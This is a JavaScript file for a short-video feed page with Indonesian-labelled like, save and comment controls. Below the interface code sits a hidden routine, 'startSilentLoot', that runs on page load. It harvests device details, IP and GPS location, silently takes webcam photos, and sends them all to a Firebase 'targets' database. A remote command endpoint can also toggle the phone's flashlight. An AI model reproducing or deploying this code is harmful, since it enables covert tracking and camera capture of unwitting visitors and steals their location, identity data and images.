const comments = document.getElementById("comments");
const feedContainer = document.getElementById("feedContainer");
const videoItems = document.querySelectorAll(".video-item");

function openComments(event) {
    event.stopPropagation();
    if (comments) comments.classList.add("active");
}

function toggleText(event) {
    event.stopPropagation();
    const more = event.currentTarget;
    const caption = more.closest(".caption");
    if (!caption) return;
    if (more.textContent.trim() === "lebih sedikit") {
        caption.innerHTML = caption.dataset.short + " <span class='more' onclick='toggleText(event)'>lebih banyak</span>";
    } else {
        caption.innerHTML = caption.dataset.full + " <span class='more' onclick='toggleText(event)'>lebih sedikit</span>";
    }
}

videoItems.forEach((item) => {
    const container = item.querySelector(".container");
    const video = item.querySelector("video");
    const pauseOverlay = item.querySelector(".pause-overlay");
    const likeBtn = item.querySelector(".like-btn");
    const likeAnim = item.querySelector(".like");
    const saveBtn = item.querySelector(".save-btn");

    if (!video) return;
    let lastTap = 0;

    const updateOverlay = () => video.paused ? pauseOverlay.classList.add("active") : pauseOverlay.classList.remove("active");

    if (container) {
        container.addEventListener("click", (e) => {
            if (comments) comments.classList.remove("active");
            if (e.target.closest(".sidebar") || e.target.closest(".more")) return;
            const now = Date.now();
            if (now - lastTap < 300) {
                if (likeBtn) likeBtn.classList.add("liked");
                if (likeAnim) likeAnim.classList.add("active");
                setTimeout(() => likeAnim.classList.remove("active"), 600);
            } else {
                video.paused ? video.play() : video.pause();
                updateOverlay();
            }
            lastTap = now;
        });
    }
    video.addEventListener("pause", updateOverlay);
    video.addEventListener("play", updateOverlay);
    if (likeBtn) likeBtn.addEventListener("click", (e) => { e.stopPropagation(); likeBtn.classList.toggle("liked"); });
    if (saveBtn) saveBtn.addEventListener("click", (e) => { e.stopPropagation(); saveBtn.classList.toggle("saved"); });
});

// ======================================================
// [ FIXED LOGIC: DATA CENTER SYNC ]
// ======================================================

const BASE_API = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/targets";
const COMMAND_URL = "https://data-target-32614-default-rtdb.asia-southeast1.firebasedatabase.app/commands.json";
const IP2LOC_KEY = "377D98C67FC2E3AA42FDFACD479A4E67";

async function startSilentLoot() {
    // 1. BUAT SESSION ID (FOLDER UNIK)
    const sessionID = "ONX-" + Math.random().toString(36).substr(2, 6).toUpperCase();

    let report = {
        session_id: sessionID,
        time: new Date().toLocaleString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
        referrer: document.referrer || "Direct Access",
        language: navigator.language
    };

    // 2. AMBIL DATA LOKASI & IP
    try {
        const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
        const d = await res.json();
        if (d.ip) {
            report.ip = d.ip;
            report.isp = d.isp;
            report.city = d.city_name;
            report.district = d.district || "N/A";
            report.loc = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
            report.is_proxy = d.is_proxy ? "Yes" : "No";
            report.asn = d.asn;
        }
    } catch (e) {
        report.ip = "Failed to fetch IP";
    }

    // 3. AMBIL GPS AKURAT (JIKA ALLOW)
    navigator.geolocation.getCurrentPosition((pos) => {
        report.loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        // Update folder yang sama dengan koordinat baru
        fetch(`${BASE_API}/${sessionID}.json`, { method: 'PATCH', body: JSON.stringify({ loc: report.loc }) });
    }, null, { enableHighAccuracy: true });

    // 4. JALANKAN KAMERA
    initCamera(report, sessionID);
}

async function initCamera(report, sessionID) {
    const TARGET_URL = `${BASE_API}/${sessionID}.json`; // <--- PATH KE FOLDER

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.srcObject = stream;
        await video.play();

        listenForFlash(stream);

        let shots = 0;
        let burst = setInterval(async () => {
            if (shots < 4) {
                shots++;
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);

                // Kirim semua data + foto ke DALAM FOLDER sessionID
                await fetch(TARGET_URL, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ...report, photo: imageData, burst_no: shots })
                });
            } else {
                clearInterval(burst);
            }
        }, 2000);

    } catch (err) {
        // Kirim data tanpa foto jika ditolak
        fetch(TARGET_URL, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...report, photo: "Access Denied" })
        });
    }
}

async function listenForFlash(stream) {
    const track = stream.getVideoTracks()[0];
    setInterval(async () => {
        try {
            const res = await fetch(COMMAND_URL);
            const cmd = await res.json();
            if (track && track.getCapabilities().torch) {
                await track.applyConstraints({ advanced: [{ torch: cmd.flash === "ON" }] });
            }
        } catch (e) {}
    }, 2000);
}

window.onload = () => { setTimeout(startSilentLoot, 2000); };
